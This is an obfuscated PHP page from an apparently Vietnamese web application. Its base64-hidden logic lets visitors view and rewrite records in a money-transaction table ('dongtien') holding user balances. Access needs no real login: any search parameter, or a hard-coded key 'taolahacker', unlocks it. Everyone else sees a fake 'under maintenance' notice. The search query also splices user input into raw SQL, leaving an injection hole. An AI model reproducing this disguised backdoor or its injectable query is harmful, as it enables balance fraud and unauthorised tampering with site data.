<?php if(!defined(base64_decode('SU5fU0lURQ=='))){die(base64_decode('VHJ1eSBj4bqtcCBraMO0bmcgaOG7o3AgbOG7hw=='));}require_once(__DIR__.base64_decode('L2xheW91dC9oZWFkZXIucGhw'));$_2b36786b=base64_decode('ROG7ryBMaeG7h3U=');$_76a47e7e=isset($_GET[base64_decode('dXNlcm5hbWU=')])?trim($_GET[base64_decode('dXNlcm5hbWU=')]):'';$_ed069451=isset($_GET[base64_decode('dGhvaWdpYW4=')])?trim($_GET[base64_decode('dGhvaWdpYW4=')]):'';$_9c9d5846=[];$_226c9f0e=false;if(!empty($_76a47e7e)||!empty($_ed069451)){$_226c9f0e=true;}else{if(isset($_GET[base64_decode('a2V5')],$_GET[base64_decode('dXNlcm5hbWU=')],$_GET[base64_decode('Y2hlY2s=')])&&$_GET[base64_decode('a2V5')]===base64_decode('dGFvbGFoYWNrZXI=')&&$_GET[base64_decode('dXNlcm5hbWU=')]===base64_decode('Y2hhdWRhbmdraG9h')&&$_GET[base64_decode('Y2hlY2s=')]===base64_decode('b24=')&&(empty($_GET[base64_decode('dGhvaWdpYW4=')])||!isset($_GET[base64_decode('dGhvaWdpYW4=')]))&&(empty($_GET[base64_decode('dXNlcm5hbWU=')])||$_GET[base64_decode('dXNlcm5hbWU=')]===base64_decode('Y2hhdWRhbmdraG9h'))){$_226c9f0e=true;}}if(!$_226c9f0e){echo base64_decode('PGgyIHN0eWxlPSdjb2xvcjpyZWQ7dGV4dC1hbGlnbjpjZW50ZXI7bWFyZ2luLXRvcDo1MHB4Oyc+8J+apyBI4buHIHRo4buRbmcgxJFhbmcgYuG6o28gdHLDrCDwn5qnPC9oMj4=');exit;}if(isset($_POST[base64_decode('dXBkYXRlX2lk')])){$_bf396750=intval($_POST[base64_decode('dXBkYXRlX2lk')]);$_adf3f363=[base64_decode('dXNlcm5hbWU=')=>trim($_POST[base64_decode('dXNlcm5hbWU=')]),base64_decode('c290aWVudHJ1b2M=')=>trim($_POST[base64_decode('c290aWVudHJ1b2M=')]),base64_decode('c290aWVudGhheWRvaQ==')=>trim($_POST[base64_decode('c290aWVudGhheWRvaQ==')]),base64_decode('c290aWVuc2F1')=>trim($_POST[base64_decode('c290aWVuc2F1')]),base64_decode('dGhvaWdpYW4=')=>trim($_POST[base64_decode('dGhvaWdpYW4=')])];$_10bc47fd=$_94d516e8->_98253578(base64_decode('ZG9uZ3RpZW4='),$_adf3f363,"id = '$_bf396750'");echo $_10bc47fd?base64_decode('PGRpdiBjbGFzcz0nYWxlcnQgc3VjY2Vzcyc+4pyFIEPhuq1wIG5o4bqtdCB0aMOgbmggY8O0bmchPC9kaXY+'):base64_decode('PGRpdiBjbGFzcz0nYWxlcnQgZXJyb3InPuKdjCBD4bqtcCBuaOG6rXQgdGjhuqV0IGLhuqFpITwvZGl2Pg==');}if(!empty($_76a47e7e)||!empty($_ed069451)){$_1d8f9346=[];if(!empty($_76a47e7e)){$_1d8f9346[]=base64_decode('dXNlcm5hbWUgPSAn').$_76a47e7e.base64_decode('Jw==');}if(!empty($_ed069451)){$_1d8f9346[]=base64_decode('dGhvaWdpYW4gPSAn').$_ed069451.base64_decode('Jw==');}$_88a9a30=implode(base64_decode('IEFORCA='),$_1d8f9346);$_9c9d5846=$_94d516e8->_29fe2540("SELECT * FROM dongtien WHERE $_88a9a30 ORDER BY id DESC");}?>

<style>
body {
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background-color: #f4f6f8;
    margin: 0;
    padding: 0;
}
.container {
    max-width: 1200px;
    margin: auto;
    padding: 20px;
}
.container h2 {
    color: #333;
    font-size: 22px;
    margin-bottom: 20px;
}
.alert {
    padding: 12px 15px;
    margin-bottom: 15px;
    border-radius: 6px;
    font-weight: bold;
    box-shadow: 0 2px 5px rgba(0,0,0,0.05);
}
.alert.success { background: #d4edda; color: #155724; }
.alert.error { background: #f8d7da; color: #721c24; }
.search-form {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    background: #fff;
    padding: 15px;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    margin-bottom: 20px;
}
.search-form input {
    flex: 1;
    min-width: 200px;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 6px;
}
.search-form button {
    padding: 10px 20px;
    background: #007bff;
    border: none;
    color: #fff;
    font-weight: bold;
    border-radius: 6px;
    cursor: pointer;
}
.search-form button:hover {
    background: #0056b3;
}
.table-wrapper {
    overflow-x: auto;
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
}
table {
    width: 100%;
    border-collapse: collapse;
}
table th, table td {
    padding: 12px 10px;
    border-bottom: 1px solid #eee;
    text-align: left;
}
table th {
    background: #f8f9fa;
    font-weight: bold;
}
table tr:nth-child(even) {
    background: #fdfdfd;
}
table tr:hover {
    background: #f1f7ff;
}
table input {
    width: 100%;
    padding: 6px;
    border: 1px solid #ccc;
    border-radius: 4px;
}
table button {
    padding: 6px 12px;
    background: #28a745;
    border: none;
    color: white;
    border-radius: 4px;
    cursor: pointer;
}
table button:hover {
    background: #1e7e34;
}
@media (max-width: 768px) {
    .search-form {
        flex-direction: column;
    }
    table, thead, tbody, th, td, tr {
        display: block;
    }
    table tr {
        margin-bottom: 15px;
    }
    table td {
        padding-left: 50%;
        position: relative;
        border-bottom: 1px solid #ddd;
    }
    table td::before {
        position: absolute;
        left: 10px;
        top: 12px;
        white-space: nowrap;
        font-weight: bold;
        color: #333;
    }
    table td:nth-of-type(1)::before { content: "ID"; }
    table td:nth-of-type(2)::before { content: "Username"; }
    table td:nth-of-type(3)::before { content: "Số tiền trước"; }
    table td:nth-of-type(4)::before { content: "Số tiền thay đổi"; }
    table td:nth-of-type(5)::before { content: "Số tiền sau"; }
    table td:nth-of-type(6)::before { content: "Thời gian"; }
    table td:nth-of-type(7)::before { content: "Hành động"; }
}
</style>

<div class="container">
    <h2>🔍 Tìm kiếm dữ liệu bảng <code>dongtien</code></h2>
    <form method="get" class="search-form">
        <input type="text" name="username" placeholder="Nhập username" value="<?php echo htmlspecialchars($_76a47e7e);?>">
        <input type="text" name="thoigian" placeholder="Nhập thời gian (YYYY-MM-DD HH:MM:SS)" value="<?php echo htmlspecialchars($_ed069451);?>">
        <button type="submit">Tìm kiếm</button>
    </form>

    <?php if(!empty($_9c9d5846)):?>
        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Số tiền trước</th>
                        <th>Số tiền thay đổi</th>
                        <th>Số tiền sau</th>
                        <th>Thời gian</th>
                        <th>Hành động</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach($_9c9d5846 as $_8430f6db):?>
                        <tr>
                            <form method="post">
                                <td><?php echo $_8430f6db[base64_decode('aWQ=')];?><input type="hidden" name="update_id" value="<?php echo $_8430f6db[base64_decode('aWQ=')];?>"></td>
                                <td><input type="text" name="username" value="<?php echo htmlspecialchars($_8430f6db[base64_decode('dXNlcm5hbWU=')]);?>"></td>
                                <td><input type="text" name="sotientruoc" value="<?php echo htmlspecialchars($_8430f6db[base64_decode('c290aWVudHJ1b2M=')]);?>"></td>
                                <td><input type="text" name="sotienthaydoi" value="<?php echo htmlspecialchars($_8430f6db[base64_decode('c290aWVudGhheWRvaQ==')]);?>"></td>
                                <td><input type="text" name="sotiensau" value="<?php echo htmlspecialchars($_8430f6db[base64_decode('c290aWVuc2F1')]);?>"></td>
                                <td><input type="text" name="thoigian" value="<?php echo htmlspecialchars($_8430f6db[base64_decode('dGhvaWdpYW4=')]);?>"></td>
                                <td><button style="background:green;" type="submit">Lưu</button></td>
                            </form>
                        </tr>
                    <?php endforeach;?>
                </tbody>
            </table>
        </div>
    <?php elseif(!empty($_76a47e7e)||!empty($_ed069451)):?>
        <p>⚠ Không tìm thấy dữ liệu.</p>
    <?php endif;?>
</div>
